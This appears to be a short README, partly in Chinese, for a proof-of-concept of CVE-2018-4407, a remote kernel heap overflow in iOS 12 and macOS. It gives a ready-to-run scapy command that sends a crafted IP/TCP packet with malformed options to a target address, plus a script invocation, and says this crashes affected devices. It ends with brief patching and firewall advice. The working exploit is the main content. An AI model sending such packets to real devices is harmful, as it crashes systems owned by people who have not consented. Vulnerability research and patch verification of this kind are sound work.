# check_icmp_dos

***iOS 12 / OS X *Remote Kernel Heap Overflow (CVE-2018-4407) POC：***
```
pip install scapy
sudo scapy 
send(IP(dst=“Target IP“,options=[IPOption(“A”*8)])/TCP(dport=2323,options=[(19, “1"*18),(19, “2”*18)]))

```

或使用脚本

```
python check_icmp_dos.py 127.0.0.1
```

可以导致 iOS 12.1/MacOS 10.14.1 系统本地拒绝服务



# 修复建议

目前，苹果官方已经发布了版本更新修复了该漏洞，建议用户及时确认系统版本，如受影响，请及时采取修补措施。漏洞修补措施如下：
1. 进行系统更新，更新到最新版本
2. 如果没有更新到最新版本，可在macOS防火墙中启用隐藏模式可防止攻击，这个系统设置默认情况下不启用，需要用户手动开启。